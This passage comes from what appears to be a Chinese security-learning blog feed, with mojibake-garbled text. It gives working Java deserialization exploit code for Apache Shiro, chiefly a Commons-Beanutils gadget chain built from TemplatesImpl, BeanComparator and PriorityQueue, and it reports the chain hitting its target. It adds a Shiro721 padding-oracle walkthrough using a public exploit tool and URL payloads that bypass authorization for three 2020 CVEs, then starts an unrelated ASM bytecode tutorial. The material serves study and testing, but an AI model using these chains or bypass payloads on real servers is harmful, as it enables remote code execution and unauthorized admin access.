class_">HashMap</span>&lt;&gt;();<br>        hashMap.put(tiedMapEntry,<span class="hljs-string">&quot;aaa&quot;</span>);<br>        <span class="hljs-type">Class</span> <span class="hljs-variable">lazyMapClass</span> <span class="hljs-operator">=</span> LazyMap.class;<br>        Field trans=lazyMapClass.getDeclaredField(<span class="hljs-string">&quot;factory&quot;</span>);<br>        trans.setAccessible(<span class="hljs-literal">true</span>);<br>        trans.set(lazyMap,invokerTransformer);<span class="hljs-comment">//è¿™é‡Œæ”¹å›æ¥chainedTransformer</span><br>        map.remove(templates);<span class="hljs-comment">//ç§»é™¤æ‰æˆ‘ä»¬æ–°å¢çš„é”®å€¼</span><br><br>        serialize(hashMap);<br>        unserialize(<span class="hljs-string">&quot;ser.bin&quot;</span>);<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">serialize</span><span class="hljs-params">(Object obj)</span><span class="hljs-keyword">throws</span> Exception&#123;<br>        ObjectOutputStream oos=<span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectOutputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileOutputStream</span>(<span class="hljs-string">&quot;ser.bin&quot;</span>));<br>        oos.writeObject(obj);<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Object <span class="hljs-title function_">unserialize</span><span class="hljs-params">(String Filename)</span><span class="hljs-keyword">throws</span> Exception&#123;<br>        ObjectInputStream ois=<span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectInputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileInputStream</span>(Filename));<br>        Object obj=ois.readObject();<br>        <span class="hljs-keyword">return</span> obj;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>æœäº†è¿™é‡Œä¹Ÿæ²¡æ‰“é€šï¼Œåå°ç›´æ¥æŠ¥é”™TiedMapEntryéƒ½æ— æ³•åŠ è½½</p><p>åæ¥æˆ‘ç”¨äº†pç¥çš„ç¯å¢ƒå°±èƒ½æ‰“é€šäº†ï¼Œä¼°è®¡è¿˜æ˜¯ccä¾èµ–è¿è¡Œæ—¶æ²¡æœ‰è¢«ç¼–è¯‘è¿›å»</p><p>è¿™æ˜¯pç¥çš„ç¯å¢ƒï¼š<a href="https://github.com/phith0n/JavaThings/tree/master/shirodemo">https://github.com/phith0n/JavaThings/tree/master/shirodemo</a></p><p><img src="http://cdn.clown2024.cn/202407151444246.png" alt="image-20240615104853896"></p><blockquote><p>æ‰“çš„æ—¶å€™è¦å»æ‰<strong>JSESSIONID</strong></p></blockquote><h2 id="æ‰“cbé“¾"><a href="#æ‰“CBé“¾" class="headerlink" title="æ‰“CBé“¾"></a>æ‰“CBé“¾</h2><p>CBé“¾æ‰“çš„æ˜¯shiroè‡ªå¸¦çš„ä¾èµ–ï¼šcommons-beanutilsï¼ˆå°±æ˜¯å¯¹javabeançš„å¢å¼ºç±»ï¼‰ï¼Œè¿™é‡Œæ³¨æ„ä¸€ä¸‹ç‰ˆæœ¬æ˜¯1.8.3çš„ï¼Œæœ¬åœ°å†™expçš„æ—¶å€™è®°å¾—ç‰ˆæœ¬ä¹Ÿè¦ä¸€è‡´ï¼Œä¸ç„¶ä¼šæ‰“ä¸é€š</p><p>ä¸‹é¢æ˜¯ä¸€ä¸ªç®€å•çš„javaBeançš„ä¾‹å­</p><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> org.apache.commons.beanutils.PropertyUtils;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">shiro_CBDemo1</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception&#123;<br>        <span class="hljs-type">Person</span> <span class="hljs-variable">person</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Person</span>(<span class="hljs-number">10</span>,<span class="hljs-string">&quot;aa&quot;</span>);<br>        System.out.println(PropertyUtils.getProperty(person, <span class="hljs-string">&quot;age&quot;</span>));<br><br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>è¿™é‡Œæˆ‘ä»¬å¯ä»¥ä¸éœ€è¦å†å»è°ƒç”¨getæ–¹æ³•æ¥è·å–å±æ€§å€¼ï¼Œè€Œæ˜¯ç›´æ¥ç”¨PropertyUtilsçš„é™æ€æ–¹æ³•æ¥è·å–</p><p>ç„¶ååœ¨è¿™å¤„ç†çš„è¿‡ç¨‹ä¸­å°±å­˜åœ¨ååºåˆ—åŒ–çš„ç‚¹ï¼Œå°±ç›´æ¥è¯´äº†ååºåˆ—åŒ–çš„ç‚¹å°±æ˜¯ä¼šè°ƒç”¨javaBeançš„getæ–¹æ³•ï¼Œæ¯”å¦‚ä¸Šé¢çš„ageå°±ä¼šè°ƒç”¨<strong>getAge</strong>æ–¹æ³•</p><p>æˆ‘ä»¬å¯ä»¥è°ƒè¯•è·Ÿè¿›å»çœ‹ä¸€ä¸‹æˆ‘ä»¬ä¼ å…¥äº†nameä¸ºâ€ageâ€ä¹‹åå‘ç”Ÿäº†ä»€ä¹ˆ</p><p>ä¸€è·¯è·Ÿè¿›ä¸‹å»ï¼Œä¼šåœ¨ä¸€ä¸ªgetSimplePropertyçš„æ–¹æ³•é‡Œé¢è·å–åˆ°javaBeançš„å„ç§æ–¹æ³•ï¼Œç„¶åä¼šæŠŠæˆ‘ä»¬ä¼ è¿›å»çš„åå­—ä»å°å†™æ”¹æˆå¤§å†™</p><blockquote><p>è€Œä¸”æˆ‘ä»¬è¿™é‡Œä¸ä¼ å¤§å†™çš„å±æ€§åè¿›å»ï¼Œä¸ç„¶ä¼šæŠ¥é”™</p></blockquote><p><img src="http://cdn.clown2024.cn/202407151444247.png" alt="image-20240615093151593"></p><p>å†å¾€ä¸‹ä¸¤è¡Œï¼Œä»–å°±è·å–äº†è¯»å–å±æ€§çš„getæ–¹æ³•ï¼Œç„¶åè¿›è¡Œå‡½æ•°è°ƒç”¨ï¼Œè·å–äº†ageçš„å€¼</p><p><img src="https://cdn.clown2024.cn/image-20240615093518572.png" alt="image-20240615093518572"></p><p>æˆ‘ä»¬ä¼ è¿›å»çš„javaBeanæœ€ç»ˆå°±ä¼šå˜æˆæˆ‘ä»¬æŒ‡å®šçš„å±æ€§çš„å€¼ç„¶åè¿”å›</p><p><img src="http://cdn.clown2024.cn/202407151444248.png" alt="image-20240615093640915"></p><p><img src="http://cdn.clown2024.cn/202407151444249.png" alt="image-20240615093725798"></p><p>è¿™é‡Œå…¶ä¸­å­˜åœ¨çš„åˆ©ç”¨ç‚¹å°±æ˜¯è¿™ä¸ªgetæ–¹æ³•çš„è°ƒç”¨</p><h3 id="templatesimpl"><a href="#TemplatesImpl" class="headerlink" title="TemplatesImpl"></a>TemplatesImpl</h3><p>è¿™é‡Œå°±è·Ÿæˆ‘ä»¬åŠ¨æ€ç±»åŠ è½½ä»»æ„ä»£ç çš„è¿™ä¸ªç±»æœ‰å…³</p><p>å®ƒé‡Œé¢æœ‰ä¸€ä¸ª<strong>getOutputProperties()<strong>çš„æ–¹æ³•ï¼Œè¿™ä¸ªæ–¹æ³•çš„å°±å¾ˆç¬¦åˆjavaBeançš„æ–¹å¼ï¼Œæœ€é‡è¦çš„æ˜¯å®ƒé‡Œé¢è¿˜è°ƒç”¨äº†</strong>newTransformer</strong>è¿™ä¸ªæ–¹æ³•</p><p><img src="http://cdn.clown2024.cn/202407151444250.png" alt="image-20240615094412956"></p><p>æ‰€ä»¥æˆ‘ä»¬åªéœ€è¦ä¼ ä¸€ä¸ª<strong>outputProperties</strong>çš„åå­—è¿›å»å°±å¯ä»¥è°ƒç”¨è¿™ä¸ªæ–¹æ³•ï¼Œè®°å¾—è¿™é‡Œä¸€å®šè¦æ˜¯<strong>å°å†™</strong>çš„å½¢å¼</p><h3 id="beancomparator"><a href="#BeanComparator" class="headerlink" title="BeanComparator"></a>BeanComparator</h3><p>æ¥ä¸‹æ¥å°±æ˜¯ä»<strong>ProperUtils</strong>å¾€ä¸Šæ‰¾çœ‹è°è°ƒç”¨äº†ä»–çš„<strong>getProperty</strong>æ–¹æ³•</p><p>è¿™é‡Œå°±æ‰¾åˆ°BeanComparatorçš„compareæ–¹æ³•</p><p><img src="http://cdn.clown2024.cn/202407151444251.png" alt="image-20240615094845997"></p><p>çœ‹ä¸€ä¸‹ä»–çš„æ„é€ æ–¹æ³•</p><p><img src="http://cdn.clown2024.cn/202407151444252.png" alt="image-20240615095155801"></p><p>è¿™é‡Œä¹Ÿæå‰è¯´ä¸€ä¸‹ï¼Œæˆ‘ä»¬éœ€è¦è°ƒç”¨ä¸‹é¢çš„æ„é€ æ–¹æ³•ï¼Œè€Œä¸èƒ½è°ƒç”¨ä¸Šé¢çš„ï¼Œå› ä¸ºä¸Šé¢çš„ComparableComparatoræ˜¯å±äºCommoms-Collectionsé‡Œé¢çš„æ–¹æ³•ï¼Œè€Œshiroè‡ªå¸¦æ˜¯æ²¡æœ‰è¿™ä¸ªçš„ï¼Œæˆ‘ä»¬æ‰“äº†å°±ä¼šæŠ¥é”™</p><p>æ‰€ä»¥è¿™é‡Œcomparatoræˆ‘ä»¬å°±éœ€è¦èµ‹å€¼ä¸€ä¸ªjavaæœ¬èº«å°±æœ‰çš„è€Œä¸”æ˜¯ç»§æ‰¿äº†åºåˆ—åŒ–æ¥å£çš„ç±»ï¼Œè¿™é‡Œç›´æ¥ç”¨ç»„é•¿è§†é¢‘é‡Œé¢ç”¨çš„é‚£ä¸ª<strong>AttrCompare</strong>ç±»</p><h3 id="priorityqueue"><a href="#PriorityQueue" class="headerlink" title="PriorityQueue"></a>PriorityQueue</h3><p>è§åˆ°è¿™ä¸ªcompareå°±å¾ˆç†Ÿæ‚‰äº†ï¼Œæˆ‘ä»¬çš„cc2å’Œcc4é‡Œé¢å°±æ˜¯åˆ©ç”¨äº†PriorityQueueçš„readObjectæ–¹æ³•ï¼Œç„¶åé‡Œé¢è°ƒç”¨compareæ–¹æ³•çš„ï¼Œé‚£é“¾å­å°±åŸºæœ¬ä¸²èµ·æ¥äº†</p><p>ç°åœ¨å¯ä»¥æ¥å†™ä¸€ä¸ªexp</p><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.cc_chain.shiro_cb;<br><br><br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xml.internal.security.c14n.helper.AttrCompare;<br><span class="hljs-keyword">import</span> org.apache.commons.beanutils.BeanComparator;<br><span class="hljs-keyword">import</span> org.apache.commons.collections4.comparators.TransformingComparator;<br><span class="hljs-keyword">import</span> org.apache.commons.collections4.functors.ConstantTransformer;<br><br><br><span class="hljs-keyword">import</span> java.io.FileInputStream;<br><span class="hljs-keyword">import</span> java.io.FileOutputStream;<br><span class="hljs-keyword">import</span> java.io.ObjectInputStream;<br><span class="hljs-keyword">import</span> java.io.ObjectOutputStream;<br><span class="hljs-keyword">import</span> java.lang.reflect.Field;<br><span class="hljs-keyword">import</span> java.nio.file.Files;<br><span class="hljs-keyword">import</span> java.nio.file.Paths;<br><span class="hljs-keyword">import</span> java.util.PriorityQueue;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">shiro_CBDemo1</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception&#123;<br><span class="hljs-comment">//        Person person = new Person(10,&quot;aa&quot;);</span><br><span class="hljs-comment">//        System.out.println(PropertyUtils.getProperty(person, &quot;age&quot;));</span><br>        <span class="hljs-comment">//cc3</span><br>        <span class="hljs-type">TemplatesImpl</span> <span class="hljs-variable">templates</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TemplatesImpl</span>();<br>        <span class="hljs-comment">//åˆ©ç”¨åå°„è®¾ç½®éœ€è¦æ»¡è¶³çš„å€¼</span><br>        Class c=templates.getClass();<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">name</span> <span class="hljs-operator">=</span> c.getDeclaredField(<span class="hljs-string">&quot;_name&quot;</span>);<br>        name.setAccessible(<span class="hljs-literal">true</span>);<br>        name.set(templates,<span class="hljs-string">&quot;aaa&quot;</span>);<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">bytecodes</span> <span class="hljs-operator">=</span> c.getDeclaredField(<span class="hljs-string">&quot;_bytecodes&quot;</span>);<br>        bytecodes.setAccessible(<span class="hljs-literal">true</span>);<br>        <span class="hljs-type">byte</span>[] code= Files.readAllBytes(Paths.get(<span class="hljs-string">&quot;D:\\code\\cc_chain\\src\\main\\java\\com.proxy\\Test.class&quot;</span>));<br>        <span class="hljs-type">byte</span>[][] codes=&#123;code&#125;;<br>        bytecodes.set(templates,codes);<br><span class="hljs-comment">//        Field tfactory = c.getDeclaredField(&quot;_tfactory&quot;);</span><br><span class="hljs-comment">//        tfactory.setAccessible(true);</span><br><span class="hljs-comment">//        tfactory.set(templates,new TransformerFactoryImpl());</span><br>        <span class="hljs-comment">//CB</span><br>        <span class="hljs-type">BeanComparator</span> <span class="hljs-variable">beanComparator</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">BeanComparator</span>(<span class="hljs-string">&quot;outputProperties&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">AttrCompare</span>());<br>        <span class="hljs-comment">//cc2</span><br>        <span class="hljs-type">TransformingComparator</span> <span class="hljs-variable">transformingComparator</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TransformingComparator</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">ConstantTransformer</span>(<span class="hljs-number">1</span>));<span class="hljs-comment">//å…ˆä¼ ä¸€ä¸ªæ²¡ç”¨ä¸œè¥¿é˜»æ–­é“¾å­æ‰§è¡Œ</span><br>        PriorityQueue&lt;Object&gt; priorityQueue = <span class="hljs-keyword">new</span> <span class="hljs-title class_">PriorityQueue</span>&lt;&gt;(transformingComparator);<br>        <span class="hljs-comment">//è¿™é‡Œçš„sizeè¦æ»¡è¶³è¦æ±‚æ‰èƒ½è§¦å‘è°ƒç”¨é“¾æ‰§è¡Œï¼Œè¿™é‡Œéœ€è¦æ”¹ç”¨æ·»åŠ å…ƒç´ æ‰è¡Œï¼Œå› ä¸ºæˆ‘ä»¬çš„templatesè¿˜æ²¡æœ‰åŠ å…¥è¿›å»</span><br>        priorityQueue.add(templates);<br>        priorityQueue.add(<span class="hljs-number">2</span>);<br><br>        <span class="hljs-comment">//ç„¶ååå°„ä¿®æ”¹å›æ¥priorityQueueçš„å€¼</span><br>        Class p=PriorityQueue.class;<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">comparator</span> <span class="hljs-operator">=</span> p.getDeclaredField(<span class="hljs-string">&quot;comparator&quot;</span>);<br>        comparator.setAccessible(<span class="hljs-literal">true</span>);<br>        comparator.set(priorityQueue,beanComparator);<br><br><br>        serialize(priorityQueue);<br>        unserialize(<span class="hljs-string">&quot;ser.bin&quot;</span>);<br><br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">serialize</span><span class="hljs-params">(Object obj)</span><span class="hljs-keyword">throws</span> Exception&#123;<br>        ObjectOutputStream oos=<span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectOutputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileOutputStream</span>(<span class="hljs-string">&quot;ser.bin&quot;</span>));<br>        oos.writeObject(obj);<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Object <span class="hljs-title function_">unserialize</span><span class="hljs-params">(String Filename)</span><span class="hljs-keyword">throws</span> Exception&#123;<br>        ObjectInputStream ois=<span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectInputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileInputStream</span>(Filename));<br>        Object obj=ois.readObject();<br>        <span class="hljs-keyword">return</span> obj;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>è¿™é‡Œç”¨äº†æ¯”è¾ƒæ‡’çš„æ”¹æ³•ï¼Œç›´æ¥å€Ÿç”¨äº†ä¸€ä¸‹cc4è¿™ä¸ªç±»ï¼Œä¸»è¦æ˜¯ä¸ºäº†åºåˆ—åŒ–èƒ½æˆåŠŸï¼Œæœ¬åœ°æµ‹è¯•æ— æ‰€è°“ï¼Œå…¶ä»–æ”¹æ³•è°ƒäº†åŠå¤©éƒ½æŠ¥é”™æ‡’å¾—è°ƒäº†ã€‚ã€‚ã€‚</p><p><img src="http://cdn.clown2024.cn/202407151444253.png" alt="image-20240615103205401"></p><p><strong>æ‰“ä¸€ä¸‹shiroçœ‹çœ‹æ•ˆæœ</strong></p><p><img src="http://cdn.clown2024.cn/202407151444254.png" alt="image-20240615103608867"></p><p>å¯ä»¥æˆåŠŸæ‰“é€š</p><blockquote><p>æ³¨æ„è¿™é‡Œå¦‚æœç”¨ysoserialç”Ÿæˆçš„payloadæ‰“æ˜¯æ‰“ä¸é€šçš„ï¼Œå› ä¸ºä»–çš„CBç‰ˆæœ¬å’Œshiroçš„ä¸ä¸€æ ·</p><p>è¿™é‡Œç”¨çš„å®˜æ–¹ç¯å¢ƒæ²¡æœ‰åˆ æ‰<strong>JSESSIONID</strong>ç«Ÿç„¶ä¹Ÿé€šäº†ï¼ˆ</p></blockquote><h3 id="cbé“¾è°ƒç”¨å›¾"><a href="#CBé“¾è°ƒç”¨å›¾" class="headerlink" title="CBé“¾è°ƒç”¨å›¾"></a>CBé“¾è°ƒç”¨å›¾</h3><p><img src="http://cdn.clown2024.cn/202407151444255.png" alt="image-20240615001956606"></p><h1 id="shiro721"><a href="#Shiro721" class="headerlink" title="Shiro721"></a>Shiro721</h1><p><strong>Shiro721å’Œ550çš„åŒºåˆ«ï¼š</strong></p><p>Shiro550åªéœ€è¦é€šè¿‡ç¢°æ’keyï¼Œçˆ†ç ´å‡ºæ¥å¯†é’¥ï¼Œå°±å¯ä»¥è¿›è¡Œåˆ©ç”¨</p><p>Shiro721çš„aseåŠ å¯†çš„keyä¸€èˆ¬æƒ…å†µä¸‹çŒœä¸åˆ°ï¼Œæ˜¯ç³»ç»Ÿéšæœºç”Ÿæˆçš„ï¼Œå¹¶ä¸”å½“å­˜åœ¨æœ‰æ•ˆçš„ç”¨æˆ·ä¿¡æ¯æ—¶æ‰ä¼šè¿›å…¥ä¸‹ä¸€é˜¶æ®µçš„æµç¨‹æ‰€ä»¥æˆ‘ä»¬éœ€è¦ä½¿ç”¨ç™»å½•åçš„rememberMe Cookieï¼Œæ‰å¯ä»¥è¿›è¡Œä¸‹ä¸€æ­¥æ”»å‡»ã€‚</p><h2 id="æ¼æ´æˆå› "><a href="#æ¼æ´æˆå› " class="headerlink" title="æ¼æ´æˆå› "></a>æ¼æ´æˆå› </h2><p>åœ¨Shiro721ä¸­ï¼ŒShiroé€šè¿‡AES-128-CBCå¯¹cookieä¸­çš„rememberMeå­—æ®µè¿›è¡ŒåŠ å¯†ï¼Œæ‰€ä»¥ç”¨æˆ·å¯ä»¥é€šè¿‡PaddingOracleåŠ å¯†ç”Ÿæˆçš„æ”»å‡»ä»£ç æ¥æ„é€ æ¶æ„çš„rememberMeå­—æ®µï¼Œè¿›è¡Œååºåˆ—åŒ–æ”»å‡»ï¼Œéœ€è¦æ‰§è¡Œçš„å‘½ä»¤è¶Šå¤æ‚ï¼Œç”Ÿæˆpayloadéœ€è¦çš„æ—¶é—´å°±è¶Šé•¿ã€‚</p><blockquote><p>ä½œä¸ºwebæ‰‹è¿˜ç‰¹åœ°å»å­¦äº†ä¸€ä¸‹åˆ†ç»„å¯†ç ï¼ŒPaddingOracleAttackæ”»å‡»æ–¹å¼è¿™é‡Œå°±ä¸è¯´åŸç†äº†ï¼Œè‡ªå·±å»å­¦ä¸€ä¸‹å°±å¥½äº†</p></blockquote><p><strong>å½±å“ç‰ˆæœ¬</strong></p><p>1.2.5,<br>1.2.6,<br>1.3.0,<br>1.3.1,<br>1.3.2,<br>1.4.0-RC2,<br>1.4.0,<br>1.4.1</p><h2 id="åˆ©ç”¨æµç¨‹"><a href="#åˆ©ç”¨æµç¨‹" class="headerlink" title="åˆ©ç”¨æµç¨‹"></a>åˆ©ç”¨æµç¨‹</h2><p>å› ä¸º721åªæ˜¯å¯†é’¥ä¸çŸ¥é“äº†ï¼Œä½†æ˜¯æ‰“è¿›å»ä¹‹ååˆ©ç”¨æ–¹å¼æ˜¯ä¸€æ ·çš„ï¼Œè¿™é‡Œç”¨å·¥å…·æ¥æ‰“äº†ç›´æ¥ã€‚</p><p>å·¥å…·åœ°å€ï¼š<a href="https://github.com/feihong-cs/ShiroExploit-Deprecated">https://github.com/feihong-cs/ShiroExploit-Deprecated</a></p><p>721çš„åˆ©ç”¨éœ€è¦æˆ‘ä»¬å…ˆèƒ½å¤Ÿæ³¨å†Œä¸€ä¸ªç”¨æˆ·ï¼Œè·å–ä¸€ä¸ªåˆæ³•çš„RememberMeå­—æ®µå€¼</p><p><img src="https://cdn.clown2024.cn/image-20241210231344048.png" alt="image-20241210231344048"></p><p>ç„¶åä¿ç•™rememberMeåˆ°å·¥å…·å¼€å§‹ä¸€æŠŠæ¢­</p><p><img src="https://cdn.clown2024.cn/image-20241210231554108.png" alt="image-20241210231554108"></p><p><img src="https://cdn.clown2024.cn/image-20241210231800952.png" alt="image-20241210231800952"></p><p>æˆ‘ä»¬å¯ä»¥åœ¨åå°æœåŠ¡ä¸­çœ‹åˆ°æŠ¥é”™æ—¥å¿—å¦‚ä¸‹ï¼š</p><p><img src="https://cdn.clown2024.cn/image-20241210231907739.png" alt="image-20241210231907739"></p><p>å¯ä»¥çœ‹åˆ°ä»–å°±æ˜¯åœ¨å°è¯•padding</p><p>ç°åœ¨æˆ‘ä»¬ç­‰å¾…å³å¯</p><p><img src="https://cdn.clown2024.cn/image-20241210231939074.png" alt="image-20241210231939074"></p><p>å°±æ˜¯å§è¿™ä¸ªç­‰å¾…çš„æ—¶é—´å§æœ‰ç‚¹ä¹…äº†å±å®æ˜¯ã€‚ã€‚ã€‚</p><h1 id="shiroæƒé™ç»•è¿‡"><a href="#shiroæƒé™ç»•è¿‡" class="headerlink" title="shiroæƒé™ç»•è¿‡"></a>shiroæƒé™ç»•è¿‡</h1><p>è¿™é‡Œè®°å½•ä¸€ä¸‹å„ä¸ªpayloadï¼Œå› ä¸ºæŒºç®€å•çš„å°±ä¸å†æ°´ä¸€ç¯‡æ–‡ç« äº†ã€‚</p><p>å…¶å®æ›´å‡†ç¡®çš„è¯´æ˜¯springä¸‹çš„shiroæƒé™ç»•è¿‡ï¼Œå› ä¸ºä¸»è¦çš„åŸå› å°±åœ¨äºshiroå’Œspringå¤„ç†urlçš„ä¸ä¸€è‡´å¯¼è‡´çš„ã€‚</p><p>å…·ä½“åŸç†å¯ä»¥çœ‹çœ‹è¿™ç¯‡æ–‡ç« çš„åˆ†æï¼š<a href="https://cangqingzhe.github.io/2021/08/26/shiro%E6%9D%83%E9%99%90%E7%BB%95%E8%BF%87%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/">https://cangqingzhe.github.io/2021/08/26/shiro%E6%9D%83%E9%99%90%E7%BB%95%E8%BF%87%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/</a></p><p><strong>å—å½±å“ç‰ˆæœ¬</strong></p><p>Apache Shiro &lt;1.5.2</p><p><strong>CVE-2020-1957</strong><br>å®¢æˆ·ç«¯è¯·æ±‚URL: &#x2F;xxx&#x2F;..;&#x2F;admin&#x2F;<br>Shrio å†…éƒ¨å¤„ç†å¾—åˆ°æ ¡éªŒURLä¸º &#x2F;xxxx&#x2F;..,æ ¡éªŒé€šè¿‡<br>SpringBoot å¤„ç† &#x2F;xxx&#x2F;..;&#x2F;admin&#x2F; , æœ€ç»ˆè¯·æ±‚ &#x2F;admin&#x2F;, æˆåŠŸè®¿é—®äº†åå°è¯·æ±‚ã€‚</p><p><strong>CVE-2020-11989</strong><br>å®¢æˆ·ç«¯è¯·æ±‚URL: &#x2F;;&#x2F;test&#x2F;admin&#x2F;page<br>Shrio å†…éƒ¨å¤„ç†å¾—åˆ°æ ¡éªŒURLä¸º&#x2F;,æ ¡éªŒé€šè¿‡<br>SpringBootæœ€ç»ˆè¯·æ±‚ &#x2F;admin&#x2F;page, æˆåŠŸè®¿é—®äº†åå°è¯·æ±‚ã€‚</p><p><strong>CVE-2020-13933</strong><br>å®¢æˆ·ç«¯è¯·æ±‚URL:&#x2F;admin&#x2F;;page<br>Shrio å†…éƒ¨å¤„ç†å¾—åˆ°æ ¡éªŒURLä¸º&#x2F;admin&#x2F;,æ ¡éªŒé€šè¿‡<br>SpringBootæœ€ç»ˆè¯·æ±‚ &#x2F;admin&#x2F;;page, æˆåŠŸè®¿é—®äº†åå°è¯·æ±‚ã€‚</p><p>è¿™ä¸ªæƒé™ç»•è¿‡çš„åˆ©ç”¨æ€è·¯å¯ä»¥å­¦ä¸€ä¸‹ï¼š<a href="https://xz.aliyun.com/t/9249?time__1311=n4+xnD0DuAG=U+DBqooGk7DCDg0cDcnCEEOoD">https://xz.aliyun.com/t/9249?time__1311=n4%2BxnD0DuAG%3DU%2BDBqooGk7DCDg0cDcnCEEOoD</a></p><h1 id="å‚è€ƒ"><a href="#å‚è€ƒ" class="headerlink" title="å‚è€ƒ"></a>å‚è€ƒ</h1><p><a href="https://www.freebuf.com/articles/web/380382.html">https://www.freebuf.com/articles/web/380382.html</a></p>]]></content>
      
      
      <categories>
          
          <category> javaæ¼æ´ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> javaååºåˆ—åŒ– </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ASMå­¦ä¹ </title>
      <link href="/2024/06/10/ASM%E5%AD%A6%E4%B9%A0/"/>
      <url>/2024/06/10/ASM%E5%AD%A6%E4%B9%A0/</url>
      
        <content type="html"><![CDATA[<p>æ¥å­¦ä¹ ä¸€ä¸‹javaçš„ASMï¼Œå’Œclasså­—èŠ‚ç ä»¥åŠä¸€äº›ç®€å•çš„jvmçŸ¥è¯†ä¹Ÿè®°å½•åœ¨è¿™ï¼Œå‚è€ƒæ–‡ç« ï¼š<a href="https://lsieun.github.io/java/asm/java-asm-season-01.html%EF%BC%8Chttps://www.javabetter.cn/jvm/class-file-jiegou.html">https://lsieun.github.io/java/asm/java-asm-season-01.htmlï¼Œhttps://www.javabetter.cn/jvm/class-file-jiegou.html</a></p><p>å› ä¸ºåé¢javaååºåˆ—åŒ–çš„å­¦ä¹ è¿˜éœ€è¦åŠ¨æ€ç”Ÿæˆæ¶æ„å­—èŠ‚ç ï¼Œæ‰€ä»¥æ¥è¡¥è¡¥åŸºç¡€ã€‚</p><h1 id="javaç±»æ–‡ä»¶ç»“æ„"><a href="#Javaç±»æ–‡ä»¶ç»“æ„" class="headerlink" title="Javaç±»æ–‡ä»¶ç»“æ„"></a>Javaç±»æ–‡ä»¶ç»“æ„</h1><h1 id="asmä»‹ç»"><a href="#ASMä»‹ç»" class="headerlink" title="ASMä»‹ç»"></a>ASMä»‹ç»</h1><p>ASMå°±æ˜¯ä¸€ä¸ªæ“ä½œjavaå­—èŠ‚ç çš„ç±»åº“ã€‚</p><p>ASMçš„æ“ä½œå¯¹è±¡å­—èŠ‚ç æ•°æ®ï¼Œå°±æ˜¯.javaæ–‡ä»¶ç»è¿‡javacä¹‹åç”Ÿæˆçš„.classæ–‡ä»¶ã€‚</p><p>ASMå¤„ç†å­—èŠ‚ç çš„æ­¥éª¤å°±æ˜¯ï¼šæ‹†åˆ†-&gt;ä¿®æ”¹-&gt;åˆå¹¶</p><ul><li>ç¬¬ä¸€æ­¥ï¼Œå°† <code>.class</code> æ–‡ä»¶æ‹†åˆ†æˆå¤šä¸ªéƒ¨åˆ†ï¼›</li><li>ç¬¬äºŒæ­¥ï¼Œå¯¹æŸä¸€ä¸ªéƒ¨åˆ†çš„ä¿¡æ¯è¿›è¡Œä¿®æ”¹ï¼›</li><li>ç¬¬ä¸‰æ­¥ï¼Œå°†å¤šä¸ªéƒ¨åˆ†é‡æ–°ç»„ç»‡æˆä¸€ä¸ªæ–°çš„ <code>.class</code> æ–‡ä»¶ã€‚</li></ul><h2 id="ç‰ˆæœ¬é—®é¢˜"><a href="#ç‰ˆæœ¬é—®é¢˜" class="headerlink" title="ç‰ˆæœ¬é—®é¢˜"></a>ç‰ˆæœ¬é—®é¢˜</h2><p>ä¸åŒçš„ASMç‰ˆæœ¬å¯¹åº”ä¸åŒçš„Javaç‰ˆæœ¬ï¼Œé«˜ç‰ˆæœ¬å¯ä»¥å…¼å®¹ä½ç‰ˆæœ¬</p><table><thead><tr><th>ASM Release</th><th>Release Date</th><th>Java Support</th></tr></thead><tbody><tr><td>2.0</td><td>2005-05-17</td><td>Java 5 language support</td></tr><tr><td>3.2</td><td>2009-06-11</td><td>support for the new <code>invokedynamic</code> code.</td></tr><tr><td>4.0</td><td>2011-10-29</td><td>Java 7 language support</td></tr><tr><td>5.0</td><td>2014-03-16</td><td><strong>Java 8 language support</strong></td></tr><tr><td>6.0</td><td>2017-09-23</td><td>Java 9 language 